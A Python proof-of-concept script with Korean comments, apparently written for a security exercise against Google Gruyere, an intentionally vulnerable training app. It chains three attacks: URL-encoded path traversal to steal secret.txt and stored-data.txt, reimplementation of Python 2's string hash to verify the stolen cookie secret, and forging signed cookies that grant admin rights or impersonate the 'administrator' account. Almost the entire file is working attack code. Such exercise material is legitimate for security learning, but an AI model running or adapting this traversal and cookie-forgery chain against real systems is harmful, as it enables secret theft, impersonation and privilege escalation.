#!/usr/bin/env python3
"""Round 2 (계속) — 경로이탈 성공 후 체이닝 검증.

1) secret.txt / stored-data.txt 원문 확보 (인코딩 우회 형태 %2e%2e%2f)
2) Python 2 str hash 재현으로 cookie_secret 검증 (이미 아는 쿠키 서명과 대조)
3) 서명 위조 쿠키로 권한 상승 PoC (읽기 전용 검증만)

Python 2.7 의 str hash 알고리즘(CPython stringobject.c, hash randomization 미사용 기본값):
    x = ord(s[0]) << 7
    for c in s: x = (1000003 * x) ^ ord(c)
    x ^= len(s)
    (64bit 부호 있는 정수로 wrap)
서버는 hash(...) & 0x7FFFFFF (27비트 마스크)를 쿠키 서명으로 쓴다.
"""
from __future__ import annotations

import subprocess
from pathlib import Path

SCRATCH = Path(__file__).resolve().parent.parent / "scratch"
GID = (SCRATCH / "gid.txt").read_text().strip().split("=", 1)[1]
BASE = f"https://google-gruyere.appspot.com/{GID}"
JAR = SCRATCH / "gruyere.cookies"
CA = "/home/taeuk/.mitmproxy/mitmproxy-ca-cert.pem"
MASK = 0x7FFFFFF


def py2_hash(s: str) -> int:
    """CPython 2.7 str.__hash__ 재현 (64비트 부호 wrap 포함)."""
    if not s:
        return 0
    x = ord(s[0]) << 7
    for ch in s:
        x = (1000003 * x) ^ ord(ch)
        x &= (1 << 64) - 1
    x ^= len(s)
    x &= (1 << 64) - 1
    if x >= 1 << 63:  # 부호 있는 64비트로 wrap
        x -= 1 << 64
    return x


def fetch_raw(path: str, cookie: str | None = None) -> str:
    cmd = [
        "curl", "-s", "-i", "--path-as-is", "--max-time", "30",
        "-x", "http://127.0.0.1:8080", "--cacert", CA, BASE + path,
    ]
    cmd += (["-H", f"Cookie: {cookie}"] if cookie else ["-b", str(JAR)])
    return subprocess.run(cmd, capture_output=True, text=True).stdout


def body_of(resp: str) -> str:
    for sep in ("\r\n\r\n", "\n\n"):
        if sep in resp:
            return resp.split(sep, 1)[1]
    return resp


def main() -> None:
    print("=" * 70)
    print("1) 경로이탈로 서버 파일 원문 확보 (인코딩 우회 %2e%2e%2f)")
    print("=" * 70)
    files = {}
    for name in ("secret.txt", "stored-data.txt"):
        resp = fetch_raw(f"/%2e%2e%2f{name}")
        body = body_of(resp)
        files[name] = body
        print(f"\n--- {name} (status line: {resp.splitlines()[0] if resp else '?'})")
        print(f"    원문(repr): {body!r}")
        (SCRATCH / f"evidence_{name}.bin").write_text(body, encoding="utf-8", errors="replace")

    print()
    print("=" * 70)
    print("2) cookie_secret 검증 — 이미 관측한 정상 쿠키 서명과 대조")
    print("=" * 70)
    secret_line = files.get("secret.txt", "")
    # 서버는 f.readline() 결과(개행 포함)를 그대로 cookie_secret 으로 쓴다.
    for cand_desc, cand in (
        ("readline() 결과(개행 포함)", secret_line if secret_line.endswith("\n") else secret_line + "\n"),
        ("개행 제거", secret_line.strip()),
    ):
        for cdata in ("brie||author", "brie|admin|author"):
            h = py2_hash(cand + cdata) & MASK
            flag = "  <<< 일치!" if (cdata == "brie||author" and h == 74315992) else ""
            print(f"  secret={cand_desc!r:28s} cdata={cdata!r:18s} → {h}{flag}")

    print()
    print("=" * 70)
    print("3) 서명 위조 쿠키로 권한 상승 PoC (읽기 전용)")
    print("=" * 70)
    secret = secret_line if secret_line.endswith("\n") else secret_line + "\n"
    forged_cases = [
        ("내 테스트 계정에 admin 부여", "brie|admin|author"),
        ("administrator 계정 사칭", "administrator|admin|author"),
    ]
    for label, cdata in forged_cases:
        h = py2_hash(secret + cdata) & MASK
        cookie = f"GRUYERE={h}|{cdata}"
        resp = fetch_raw("/manage.gtl", cookie=f"GRUYERE={h}|{cdata}")
        body = body_of(resp)
        admin_ui = "Manage this server" in body
        print(f"\n--- {label}: Cookie: {cookie}")
        print(f"    /manage.gtl 렌더: {len(body)} bytes")
        # 관리자 전용 UI 신호: newaccount/editprofile 페이지의 is_admin 분기와
        # /manage.gtl 자체가 admin 링크를 요구하는지로 판정
        dump = fetch_raw("/dump.gtl", cookie=cookie)
        import re

        m = re.search(r"_cookie:&nbsp;</td>\s*<td valign='top'><pre>(.*?)</pre>", dump, re.S)
        print(f"    /dump.gtl 이 서버가 파싱한 쿠키: {m.group(1).strip() if m else '?'}")
        print(f"    관리자 전용 링크('Manage this server') 노출: {admin_ui}")
        (SCRATCH / f"forged_cookie_{cdata.replace('|', '_')}.txt").write_text(
            f"Cookie: {cookie}\n\n{body}", encoding="utf-8", errors="replace"
        )


if __name__ == "__main__":
    main()
